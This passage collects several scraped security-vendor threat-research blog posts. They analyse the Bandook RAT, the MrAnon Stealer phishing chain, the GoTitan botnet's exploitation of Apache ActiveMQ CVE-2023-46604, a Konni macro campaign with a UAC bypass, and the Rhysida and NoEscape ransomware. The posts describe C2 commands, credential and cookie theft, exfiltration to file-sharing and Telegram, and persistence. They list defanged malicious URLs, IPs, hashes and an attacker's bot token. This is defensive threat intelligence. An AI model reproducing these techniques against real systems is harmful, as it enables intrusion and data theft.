directory}\\Lib\\dpx.pyc with arguments Arg2~Arg6. The {Parent directory} is stored in the registry key pthma under HKCU\\Software. @0126 checks pthma’s value and sends the result to the server. @0127 writes its Arg2 to pthma if fcd.dll is initialized in the victim’s computer. Additionally, some commands send special data to the server: @0124 This action monitors the victim’s screen and controls the computer. When Bandook receives this command, it overwrites the config file of Firefox pref.js with code hard-coded in the payload and disables protection mechanisms in Microsoft Edge: Registry Key name Value Software\\Microsoft\\Internet Explorer TabProcGrowth 0 NoProtectedModeBanner 1 Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3 2500 3 After this, Bandook creates a virtual desktop and assigns it to a newly created thread (Thread_Control) that establishes a new communication with the C2 server. It first sends the string AVE_MARIA, followed by another packet containing the number 1, to the server. If the server responds, Bandook creates another thread to keep sending screenshots to the server. This thread also sends two packets: the string AVE_MARIA and the number 0. In the meantime, Thread_Control receives coordinates and control codes from the server. These tasks include: In addition, there are three new commands compared to the 2021 variant: @0138 This writes encrypted backup URLs to the registry key kPYXM under HKCU\\Software\\AkZhAyV0\\. When the current C2 server is unavailable, Bandook will decrypt it and try to access the URLs. The format of the decrypted data will look like this: {URL}|{URL}|{URL}| Bandook will extract URLs and try these sequentially if the previous URL is unavailable. @0139 This command asks Bandook to parse cookies from the browser specified by the C2, including Chrome, Edge, and Firefox, and save the result as Default.json in a .zip file. @0140 In the previous variant, @0140 is missing. This command asks Bandook to establish a persistence mechanism with sub_13160400, also called when the control code is GUM, as shown in Figure 9. This article unveils new details about the C2 mechanism of this long-existing malware and the new features in its latest variant. A large number of commands for C2 communication can be found in this malware. However, the tasks performed by its payload are fewer than the number in the command. This is because multiple commands are used for a single action, some commands call functions in other modules, and some are only used to respond to the server. Though the entire system is not observed in this attack, FortiGuard will continue monitoring malware variants and provide appropriate protections. The malware described in this report are detected and blocked by FortiGuard Antivirus as: PDF/Agent.1F56!trW32/Injector.EQDO!trW32/Bandok.NAT!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. 77[.]91[.]100[.]23745[.]67[.]34[.]219 8904ce99827280e447cb19cf226f814b24b0b4eec18dd758e7fb93476b7bf8b8d3e7b5be903eb9a596b9b2b78e5dd28390c6aadb8bdd4ea1ba3d896d99fa00573169171e671315e18949b2ff334db83f81a3962b8389253561c813f01974670be87c338d926cc32c966fce2e968cf6a20c088dc6aedf0467224725ce36c9a5252e7998a8df9491dad978dee76c63cb1493945b9cf198d856a395ba0fae5c265a430b9e91a0936978757eb8c493d06cbd2869f4e332ae00be0b759f2f229ca8cecd78f0f4869d986cf129a6c108264a3517dbcf16ecfc7c88ff3654a6c9be2bca remote access trojan FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/bandook-persistent-threat-that-keeps-evolving"
  },
  {
    "title": "MrAnon Stealer Spreads via Email with Fake Hotel Booking PDF",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The information collected can be used for future attacksSeverity Level:High FortiGuard Labs recently identified an email phishing campaign using deceptive booking information to entice victims into clicking on a malicious PDF file. The PDF downloads a .NET executable file created with PowerGUI and then runs a PowerShell script to fetch the final malware, known as MrAnon Stealer. This malware is a Python-based information stealer compressed with cx-Freeze to evade detection. MrAnon Stealer steals its victims' credentials, system information, browser sessions, and cryptocurrency extensions. Figure 1 illustrates the attack flow. The downloader URL was mostly queried in Germany, which suggests it was the primary target of the attack. The number of queries for this URL rose significantly in November 2023, implying the campaign was more active and aggressive during that month. In this article, we will detail the behavior of this malware at each stage. The attacker, masquerading as a company looking to reserve hotel rooms, sends phishing emails with the subject, “December Room Availability Query.” The body contains bogus hotel booking details for the holiday season. The attached malicious PDF file has a downloader link hidden in the stream object. Its data after decoding is shown below: Using the strings in the class “Loader,” we identified that the malware used the PowerShell script editor that converts PowerShell scripts to Microsoft executable files. Upon examination of the .NET executable file shown in Figure 6, we found that it utilizes ScriptRunner.dll to extract “Scripts.zip” to obtain a PowerShell script. The extracted file is deposited at the following location: “%USERPROFILE%\\AppData\\Local\\Temp\\Quest Software\\PowerGUI”. This .NET Microsoft Windows executable is solely tasked with unpacking an embedded script named “down2.ps1” and executing it using PowerShell.exe. The packed file and PowerShell configurations are within the resources section of the file, as illustrated in Figure 7. The script initiates the loading of a Windows Form and configures its settings, including form, label, and progress bar. Additionally, it defines text within the execution of the subsequent script to mitigate user suspicions. Within the \"Form Load event\" section, the script retrieves a payload from the identical domain, “anonbin[.]ir,” and decompresses the file in the temporary folder. It then locates the execution file within the zip archive and employs “Start-Process” for execution. A window named “File Not Supported” is displayed in this state, accompanied by a status message indicating “Not Run: python.exe.” This deceptive presentation is designed to mislead users into believing that the malware has not been executed successfully. Figure 10 illustrates the window and progress bar during the execution of the malware. The compressed file “Ads-Pro-V6-Free-Trail (1).zip” includes multiple files. Figure 11 shows the contents of the extracted folder. Within this folder, two DLL files serve as clean components to facilitate the loading of additional Python code by the “python.exe” process. Figure 12 illustrates the WinMain function in “python.exe,” clearly indicating that this is not a legitimate Python executable. Tracing the initial call reveals that the execution file originates from cx_Freeze tools. The script then searches for the directory “\\lib\\library.zip” and uses “PyObject_CallObject” to invoke the malicious Python code. Figure 15 shows the files from “library.zip.” Notably, “cstgversion__main__.pyc” stands out due to its distinct creation time compared to the legitimate files. This particular file encompasses the primary functions responsible for data theft. First, the malware verifies whether the following processes are currently running on the system and terminates them if they exist: “ArmoryQt.exe”, “Atomic Wallet.exe”, “brave.exe”, “bytecoin-gui.exe”, “chrome.exe”, “Coinomi.exe”, “Discord.exe”, “DiscordCanary.exe”, “Element.exe”, “Exodus.exe”, “firefox.exe”, “Guarda.exe”, “KeePassXC.exe”, “NordVPN.exe”, “OpenVPNConnect.exe”, “seamonkey.exe”, “Signal.exe”, “Telegram.exe”, “filezilla.exe”, “filezilla-server-gui.exe”, “keepassxc-proxy.exe”, “msedge.exe”, “nordvpn-service.exe”, “opera.exe”, “steam.exe”, “walletd.exe”, “waterfox.exe”, “yandex.exe” It then uses “ImageGrab” to capture a screenshot, saving it with the filename “Screenshot (Username ).png.” Additionally, it establishes connections with legitimate websites such as “api.ipify.org” and “geolocation-db.com/jsonp” to retrieve the system’s IP address, country name, and country code. It also gathers information from the following sources: Next, it compresses the stolen data, secures it with a password, and designates the filename as “Log (Username).zip.” The compressed file is then uploaded to a public file-sharing website using the URL “hxxps://store1[.]gofile[.]io/uploadFile.” Finally, it appends the download link and system information to a message that is sent to the attacker's Telegram channel using the bot token “6799784870:AAHEU6EUdnAjRcH8Qq0TCokNtVJSL06VmbU.” The support channel for MrAnon Stealer is shown in Figure 18. This support channel promotes its product, provides enhanced capabilities, and includes a purchase page at “hxxp[:]//anoncrypter[.]com” for all associated tools (Figure 19). The malicious actor established the website “anonbin[.]ir” earlier this year, as shown in Figure 20, and downloaded all associated files. Upon investigation, we discovered analogous packed files utilizing cx_Freeze from July. These files consistently feature Python-based stealers, identified by the shared \"HYDRA\" banner within the code, as illustrated in Figure 21. The campaign initially disseminated Cstealer in July and August but transitioned to distributing MrAnon Stealer in October and November. This pattern suggests a strategic approach involving the continued use of phishing emails to propagate a variety of Python-based stealers. In this attack, the threat attacker sends phishing emails with fake room booking details, aiming at specific regions. The malware uses PowerGUI and cx-Freeze tools to create a complex process that involves .NET executable files and PowerShell scripts. The attacker also uses tricks like false error messages to hide successful infection. The malware downloads and extracts files from a specific domain to run a harmful Python script. The script extracts clean DLL files and malware named “python.exe.” These are used to cover up the loading of the malicious payload—MrAnon Stealer. It steals data and sensitive information from several applications and then compresses and uploads the stolen data to a public file-sharing website and the threat actor’s Telegram channel. Users should be careful of phishing emails and unclear PDF files. The malware described in this report are detected and blocked byFortiGuard Antivirusas: PDF/Agent.AZN!tr.dldrMSIL/Agent.FT!trPOWERSHELL/Agent.F6C9!trPython/Stealer.AZN!trW64/Agent.7E0B!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The URLs are rated as “Malicious Websites” by theFortiGuard Web Filteringservice. The FortiGuard CDR (content disarm and reconstruction) service can detect and disarm the malicious macros embedded in this email. We also suggest that organizations go through Fortinet’s freeNSE training:Fortinet Certified Fundamentals (FCF). The FCF training helps end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. anonbin[.]iranoncrypter[.]com 075e40be20b4bc5826aa0b031c0ba8355711c66c947bbbaf926b92edb2844cb048e09b8043c0d5dfc2047b573112ead889b112108507d400d2ce3db18987f6c90efba3964f4b760965e94b4d1a597e6cd16241b8c8bf77a664d6216d1420b3128a8c9acf09c84ab5ea4c098eace93888a88b82a1485255073c93ce6080d05ec796ec8ef2338d36b7122a76b0398d97e8d0ed55c85e31649ea00e57d6b1f536288b71525ca378463784ce2d81a8371714580c58f0d305a2aa4630dc964c8c0ee045ee224e571d0fd3a72af1d7a7718e61a1aad03b449cf85377411d51c135bb22 phishing,info stealer malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/mranon-stealer-spreads-via-email-with-fake-hotel-booking-pdf"
  },
  {
    "title": "GoTitan Botnet - Ongoing Exploitation on Apache ActiveMQ",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Any OS running Apache Active MQ versions prior to 5.15.16, 5.16.7, 5.17.6, and 5.18.3Impacted Parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical This past October, Apache issued a criticaladvisoryaddressing CVE-2023-46604, a vulnerability involving the deserialization of untrusted data in Apache. On November 2, the Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2023-46604 to its known exploited list,KEV Catalog, indicating this vulnerability's high risk and impact. Fortiguard Labs also released anoutbreak alertand athreat signal reportabout the active exploitation of CVE-2023-46604, providing more details and recommendations for mitigation. Technical details and proof-of-concept (PoC) code for CVE-2023-46604 are publicly available, making it easier for attackers to exploit this vulnerability. In recent weeks, Fortiguard Labs has detected numerous threat actors exploiting CVE-2023-46604 to disseminate diverse strains of malware. Our analysis has unveiled the emergence of a newly discovered Golang-based botnet named GoTitan and a .NET program called \"PrCtrl Rat,\" equipped with remote control capabilities. Additionally, we have identified other well-known malware and tools in play. Initially developed as an advanced penetration testing tool and red teaming framework, Sliver supports various callback protocols, including DNS, TCP, and HTTP(S), streamlining egress processes. Kinsing has solidified its position in cryptojacking operations, showcasing its ability to quickly capitalize on newly discovered vulnerabilities. Meanwhile, Ddostf, with a history dating back to 2016, continues to exhibit its proficiency in executing targeted Distributed Denial of Service (DDoS) attacks. This article will detail the exploitation and provide insights into the malware associated with these recent attacks. The attacker initiates a connection to ActiveMQ through the OpenWire protocol, typically on port 61616. By transmitting a crafted packet, the attacker triggers the system to unmarshal a class under their control. This action, in turn, prompts the vulnerable server to retrieve and load a class configuration XML file from a specified remote URL, requiring the presence of a predefined XML file hosted externally. The known exploitation of this vulnerability involves leveraging the “ClassPathXmlApplicationContext” to load a malicious XML application configuration file from a network location via HTTP. Figure 1 shows the captured attacking traffic. The malicious XML file defines the arbitrary code intended to execute on the compromised machine. Attackers can set parameters like “cmd” or “bash” to achieve code execution on the remote vulnerable server (Figure 2). In the following sections, we will explain how the malware works and what it does on infected systems. GoTitan is a new botnet discovered earlier this month. It is written in the Go programming language and is downloaded from a malicious URL, “hxxp://91.92.242.14/main-linux-amd64s”. The attacker only provides binaries for x64 architectures, and the malware performs some checks before running. It also creates a file named \"c.log\" that records the execution time and program status. This file seems to be a debug log for the developer, which suggests that GoTitan is still in an early stage of development. It replicates itself as “/.mod” within the system and establishes a recurring execution by registering in the cron. It then retrieves the C2 IP address and gathers essential information about the compromised endpoint, including architecture, memory, and CPU details. Compiling all the collected data using “<==>” as separators, it transmits its collected information to the C2 server. The C2 message initiates with the hard coded string “Titan<==>”. GoTitan communicates with its C2 server by sending “\\xFE\\xFE” as a heartbeat signal and waiting for further instructions. When it receives a command, it passes it to a function named “handle_socket_func2” that determines an attack method. GoTitan supports ten different methods of launching distributed denial-of-service (DDoS) attacks: UDP, UDP HEX, TCP, TLS, RAW, HTTP GET, HTTP POST, HTTP HEAD, and HTTP PUT. Sliver, an open-source penetration testing tool developed in the Go language and available on GitHub, possesses the potential for misuse when wielded by threat actors due to its diverse features catering to each stage of penetration testing. Threat actors can leverage Sliver to compromise and control multiple targets across various platforms and architectures. The tool enables the generation of customized implants designed to elude detection, allowing for the execution of commands, file uploads and downloads, screenshot capture, and more on infected systems. When communicating with the C2 server at “91[.]92[.]240[.]41” via HTTP requests, Sliver dynamically selects decoders for C2 messages based on parameters in the URI. Additionally, Sliver supports various encoders, including Base32, Base58, Base64, English encoder, Gzip, Hex, and PNG. The encoded C2 communication in HTTP protocol is shown in Figure 8. The attacker retrieves the execution file from “hxxp://199[.]231[.]186[.]249:8000/unifo.dat” and stores it as “svc_veeam.exe”. The file 'unifo.dat' is a .Net framework program initially labeled as “prcli.exe” that was created in August and still spread via CVE-2023-46604. Figure 10 shows the PDB path and detailed information. For persistence, it adds “Security Service” with the current process into the registry “HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run.” It then starts the connection to C2 server “173[.]214[.]167[.]155.” Once the command is received from a remote server, it checks for a length of four. If not, it exits the program. It supports five commands: As of this writing, we have yet to receive any messages from the server, and the motive behind disseminating this tool remains unclear. However, once it infiltrates a user's environment, the remote server gains control over the system. Kinsing fetches the bash script from “194[.]38[.]22[.]53/acb.sh.” It serves the following purposes: The batch script used by Ddostf is retrieved from “hxxp://42[.]121[.]111[.]112:81/xml.sh.” It configures the history log with “+o” to prevent the recording of the current session. It then installs curl to download additional execution files and eliminate any traces. The executable file “tomcat” includes the recognizable string “ddos.tf” and the Base64-encoded string for “v8.ter.tf.” Its characteristics align with those of a threat actor who had targeted China in 2018. It first verifies that it has root privilege and that the process is running on the device. It then ensures that it will persist on the device by executing the command shown below. Ddostf includes a hard-coded string, “TF-Linux kernel…,” which appends either “SYN-“ or “UDP-“ in its C2 message, depending on whether the process runs with root privileges. Ddostf incorporates 13 attack methods: SYN_Flood, WZSYN_Flood, ICMP_Flood, GET_Flood, GETFT_Flood, HEAD_Flood, POST_Flood, xzcc_Flood, TCP_Flood, WZTCP_Flood, ack_Flood, WZUDP_Flood, and UDP_Flood. Additionally, it defines a function called “DNS_Flood,” which is not included in the current switch cases and is possibly intended for future enhancements. Despite the release of a patch for CVE-2023-46604 over a month ago, threat actors persist in exploiting this vulnerability to distribute malware on susceptible servers. This blog introduces newly discovered threats, including the Golang-based botnet GoTitan and the .NET program “PrCtrl Rat,” which have emerged as a consequence of this exploitation. Additionally, users should remain vigilant against ongoing exploits by Sliver, Kinsing, and Ddostf. It is crucial to prioritize system updates and patching and regularly monitor security advisories to effectively mitigate the risk of exploitation. The malware described in this report are detected and blocked byFortiGuard Antivirusas: XML/Agent.E2ED!trBASH/Miner.BPH!trBASH/Agent.5C93!trELF/GoTitan.AR!trLinux/Sliver.AE!trELF/Ddostf.D!trMSIL/Agent.F3D5!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Fortinet has also released an IPS signature to proactively protect our customers from the threats contained in the report: CVE-2023-46604:Apache.ActiveMQ.CVE-2023-46604.Code.Execution The URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. We also suggest that organizations use Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. 185[.]122[.]204[.]197194[.]38[.]22[.]5342[.]121[.]111[.]11291[.]92[.]242[.]14199[.]231[.]186[.]249173[.]214[.]167[.]15591[.]92[.]240[.]41 f75cb3e540b96cd54a966c512c854c832807e354772ae1a326b758394b01b607dbf8ba47a5973c86fef32c2d696b09e1930a8384087c62ace1aa5c4084ee1a3f1a3d9960a1685707f8cc2bc447c88f5c3278454fbf0a35a7959717ad835348cdd8f55bbbcc20e81e46b9bf78f93b73f002c76a8fcdb4dc2ae21b8609445c14f90cc60a0c480e4d898fa77ab501bbd2afaf3f5fb89a2917a31e7f5fdaa6c3879ced09f95f4b4b482207bb300ff6ec15ed8ca5fdde97af02fa9fbe01adaaf7673bbfce7938591dd9fa3e1368d7eb86fc7f11e935349437fc11de4f124bbbc16deef5a36570506bfaff60b684cd26dde3a64a3db4eaa9da78a1434cfd4b390ef3d55acf5ce55678519cd65e001d3f600fa1de288f1cd3e203b4c9439979f4b67175923f2be3d55fcdab7da5cb2be3c16dfcc1582b83d1e4a831236445a52ca81878b90abde8f449bbe6bec9495386fab1833c0654f83c7b2f5ebcf5b14743c30600 botnets,apache FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/gotitan-botnet-exploitation-on-apache-activemq"
  },
  {
    "title": "Konni Campaign Distributed Via Malicious Document",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Remote attackers gain control of the infected systemsSeverity Level:Critical FortiGuard Labs recently identified the use of a Russian-language Word document equipped with a malicious macro in the ongoing Konni campaign. Despite the document's creation date of September, ongoing activity on the campaign's C2 server is evident in internal telemetry, as shown in Figure 1. This campaign relies on aremote access trojan (RAT)capable of extracting information and executing commands on compromised devices. Operating for several years, this campaign employs diverse strategies for initial access, payload delivery, and establishing persistence within victims' networks. In this blog, we will elaborate on the behavior of the malware at each stage. Upon opening the document, a yellow prompt bar appears, displaying “Enable Content” alongside some ambiguous Russian text (Figure 2). Upon selecting the button, a VBA script is initiated that displays an article in Russian that translates to “Western Assessments of the Progress of the Special Military Operation.” The VBA script (Figure 3) retrieves information from “OLEFormat.IconLabel” and stores it in a temporary folder under the filename “temp.zip.” After extracting the file's contents, it runs the “check.bat” script using the “vbHide” parameter, ensuring the batch script executes without presenting a command prompt window to the user. This method is valuable when a threat actor seeks to discreetly run a script in the background, avoiding user interaction or visible windows. The initial script file, named “check.bat” (Figure 4), performs several checks. Initially, it verifies the presence of a remote connection session. If detected, it directly initiates the “netpp.bat” script. The script then assesses whether the current system is running Windows 10, assigning a value of 1 to the variable “%Num%” regardless of the outcome. This variable later plays a role in selecting the UAC bypass method. This UAC setting is different from KONNI campaigns of the past that set either 4 or 1 for different operation systems. Additionally, it examines whether the system operates on a 64-bit architecture. If so, it renames the corresponding DLL files to “netpp.dll” and “wpns.dll” and removes extraneous DLL files. Finally, it executes “wpns.dll” with three parameters: “QQQQQQQ” as the targeted entry point name, “%Num%” denoting the chosen UAC bypass method, and “netpp.bat” for further action. Each DLL file in the Word document has been compressed using UPX. We will delve into the specifics using the 64-bit version files since their 32-bit counterparts have similar functionalities. Firstly, “wpns.dll” is invoked in the batch file “check.bat.” It is primarily designed for UAC bypass. In the batch file, the parameter is configured as 1, prompting the selection of the sub_180001B90 function, as illustrated in Figure 5. It initiates the process “wusa.exe,” a legitimate Windows utility responsible for installing and uninstalling Windows updates and packages. Because it is signed and trusted by the operating system, it runs with elevated privileges without triggering User Account Control (UAC) prompts. After establishing “wusa.exe,” it then duplicates its access token and proceeds to execute a specified command using “CreateProcessWithLogonW” using that token. Finally, it runs a “netpp.bat” script that inherits the elevated privileges. A segment of the code is shown in Figure 6. Figure 7 shows the content of the batch file \"netpp.bat.\" Here is a concise explanation of its functions: Initially, the program verifies several Windows API functions across various libraries, as shown in Figure 8. If it succeeds in loading those functions, the program continues; otherwise, it returns 0 and terminates. The C2 configuration stored in “netpp.ini” is encrypted using AES-CTR, and the key is derived from the service name established in the preceding step, namely, “netpp.” The first 16 bytes of “netpp.ini” are used as the Initialization Vector (IV) to decrypt and unveil the C2 server list, as seen in Figure 9. The program then adds a registry entry using the command “cmd /c REG ADD HKCU\\Console /v CodePage /t REG_DWORD /d 65001 /f” and begins gathering information from the compromised system. It uses the command “cmd /c systeminfo” to collect comprehensive details about the target system, including the operating system version, system manufacturer, available hotfixes, system uptime, and network configuration. This data is stored in a temporary file, and the program concatenates the string “rr “ with the system's time to create the file name. Following this, it executes “cmd /c makecab” to compress the file unless the temporary file has one of the following extensions: \".7z,\" \".zip,\" \".rar,\" \".cab,\" \".docx,\" or \".xlsx,\" as shown in Figure 10. Next, using the AES-CTR algorithm, it uses the filename as the key to encrypt the CAB file. The encrypted data is then uploaded to the C2 server via a POST request, employing a hardcoded HTTP syntax, as illustrated in Figure 11. Afterward, it utilizes the command \"cmd /c tasklist” to fetch a list of currently active processes on the system. This helps the threat actor understand the system's status and potentially identify implemented security measures. This data undergoes the same procedure as the earlier process and is transmitted to the C2 server. The entire C2 request is directed to “up.php” with the parameter “name=%PCNAME%,” as shown in Figure 12. Following the upload, the program removes the temporary file to eliminate traces. Next, it attempts to get a payload or command from the C2 server by dispatching an HTTP request to “dn.php” with the parameters “name=%PCNAME%” and “prefix.” The potential values for “prefix” include “cc” followed by a digit or a straightforward string “tt.” The C2 sessions are illustrated in Figure 13. Although the actual command from the C2 server remains undisclosed, we can deduce it from the assembly code within the DLL file. Upon receiving a response from the server, the system dissects the data using “#” as a delimiter, performs base64 decoding, and decrypts the information using AES. The deciphered content is then stored as a temporary file. The program then executes “cmd /c expand –R” to retrieve the payload for subsequent actions, as shown in Figure 14. Figure 15 shows the partial code of how it handles the C2 commands, which include executing a command with specific privileges, downloading a file, and uploading a particular file. This article explores an advanced toolset employed by a sophisticated threat actor within a Word document using batch scripts and DLL files. The payload incorporates a UAC bypass and encrypted communication with a C2 server, enabling the threat actor to execute privileged commands. As this malware continues to evolve, users are advised to exercise caution with suspicious documents. The malware described in this report are detected and blocked byFortiGuard Antivirusas: VBA/Agent.CXE!trBASH/Agent.KON!trW64/Agent.ATC!trW32/Agent.AEQN!trW32/Agent.AFRB!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Fortinet has also released IPS signatures to proactively protect our customers from the threats contained in the exploit list. The URLs are rated as “Malicious Websites” by theFortiGuard Web Filteringservice. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident ResponseTeam. kmdqj1[.]c1[.]bizouvxu2[.]c1[.]biz9b31n8[.]c1[.]biz3pl0y5[.]c1[.]bizdpgbep[.]c1[.]biz7qnbae[.]c1[.]bizglws5m[.]c1[.]bizewqqa4[.]c1[.]biz3897lb[.]c1[.]biz558ga9[.]c1[.]bizb91stf[.]c1[.]bizbg5pl1[.]c1[.]bizcaoy9n[.]c1[.]bizrziju6[.]c1[.]bizpm90p1[.]c1[.]bizpxyunf[.]c1[.]bizm2jymd[.]c1[.]bizaocsff[.]c1[.]biz6e2nbc[.]c1[.]bizvqt9i1[.]c1[.]biz ac9b814b98a962bc77b2ab862d9c3b1ba5f7e86b80797259b4fcb40bfb389081f07e55ce20e944706232013241d23282e652de2c9514904dede14d4a711a5d1d085cdb09aba0024c0cadbefe428817829bbe4ab0f68598572ebccc2f6f25e78f793b8e72fded73ae6839e678b03bd5c99959f47a1ad632095ba60fb89f66fa9183e66d912ca592bc2accfd9c275647f287b6dc72a859054a348e616537999b64656dd6e67a51aebc6c69dc35eaba2e1502f225ae6fd9d0a5ff70879982427844cfbc7e6a89e4a23a72c7bcd9019197721f18506d9ab842011e0ab9d9eb24c2cc rat trojan FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/konni-campaign-distributed-via-malicious-document"
  },
  {
    "title": "Investigating the New Rhysida Ransomware",
    "content": "FortiGuard Labs Threat Research The goal of theFortiGuard IR teamis to provide organizations with valuable insights from threat analysis to bolster their security posture. We recently conducted acomprehensive analysis of an incident involving the Rhysida ransomware group, shedding light on their operations, tactics, and impact, including a novel technique involving ESXi-based ransomware. The Rhysida group was first identified in May 2023, when they claimed their first victim. This group deploys a ransomware variant known asRhysidaand also offers it asRansomware-as-a-service (RaaS). The group has listed around 50 victims so far in 2023. The investigation conducted by the FortiGuard IR team and MDR team uncovered some of the techniques and tools used by Rhysida: The initial detection was identified by the FortiGuard MDR team. The threat actor was observed accessing systems in a victim's network and attempting to create memory dumps and gather user data. FortiEDR detected these events, allowing the MDR team to analyze them further. Following the initial detection and triage, the FortiGuard IR team was engaged to conduct a complete analysis. The threat actors abuse legitimate software such as PowerShell to gain information about users and systems within the network, PSExec to schedule tasks and make changes to registry keys to maintain persistence, AnyDesk for remote connections, and WinSCP for file transfers. The threat actors also attempt to exfiltrate data from various systems using MegaSync. The report also covers the additional malware the FortiGuard IR Team identified, along with a technique we don’t often see where the group deployed Windows and Linux binaries. Restricting Veeam access to only designated machines hindered the threat actors from gaining access to the backup files. Moreover, the prudent management of passwords for vSphere fortified the victim's defense. The Rhysida ransomware group is known to target vSphere and look for credentials, so the safeguards that the victim implemented were vital to preventing widespread ransomware of the virtual infrastructure. Staying informed on the landscape of cyber threats is critical. This analysis of the Rhysida group serves as a valuable resource for organizations. By uncovering motives and impact, theFortiGuard IR teams’ findings can guide proactive strategies. For a comprehensive understanding of our investigation into Rhysida, including a list of Fortinet protections able to safeguard your organization, look at the full intrusion analysis reporthere. incident response,ransomware FortiGuard Labs Threat Research CISO Collective CISO Collective Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/investigating-the-new-rhysida-ransomware"
  },
  {
    "title": "Ransomware Roundup – NoEscape",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the NoEscape ransomware. Affected platforms:Microsoft Windows, Linux, and ESXiImpacted parties:Microsoft Windows, Linux, and ESXi UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High NoEscape is a financially motivated ransomware group that emerged in May 2023. The group runs a Ransomware-as-a-Service program. The developer creates and provides necessary pre- and post-infection tools for affiliates to perform malicious activities such as compromising victims, data exfiltration, and encryptor (ransomware) deployments. The group has victimized numerous organizations across multiple industries, including government, energy, hospitals, and physicians’ clinics. The NoEscape ransomware group is believed to be related to the now-defunct Avaddon ransomware group. Information on the infection vector used by the NoEscape ransomware threat actor is not currently available. However, it is not likely to differ significantly from other ransomware groups. According to data collected through Fortinet'sFortiRecon service, the NoEscape ransomware group has targeted multiple industry verticals (Figure 1). Business services were most impacted by the ransomware, followed by the manufacturing and retail sectors. Victims of the NoEscape ransomware also include government organizations, hospitals, and medical clinics. When victim organizations are ranked according to country (Figure 2), the United States leads by a wide margin. As of November 3, 2023, the NoEscape ransomware group had last posted new victims on October 27th. Once a network has been compromised and data has been exfiltrated, the NoEscape attacker deploys and runs a file encryptor, which terminates the following services and processes: The ransomware encrypts files on the compromised systems and appends a “.[random 10-character uppercase alphabet]” extension to the affected files. The ransomware avoids encrypting the following file extensions: The NoEscape ransomware also exempts the following directories from file encryption: It then leaves a ransom note titled “HOW_TO_RECOVER_FILES.txt.” The ransom note instructs victims to visit a TOR site for further instructions. The actual ransom negotiation takes place on TOX. It also insists that the NoEscape ransomware group is financially driven and is not politically motivated. The NoEscape ransomware has variants that affect Linux and VMware ESXi. The NoEscape ransomware group owns a TOR site where victims can contact the threat actor. Stolen information and a list of victims are also posted there. Victims are instructed to visit the TOR site below and enter the unique personal ID listed on the ransom note. As of November 3, the “NoEscape” blog lists 20 active NoEscape ransomware victims. If victims do not comply with the attacker's request, another message is added to the page assigned to each 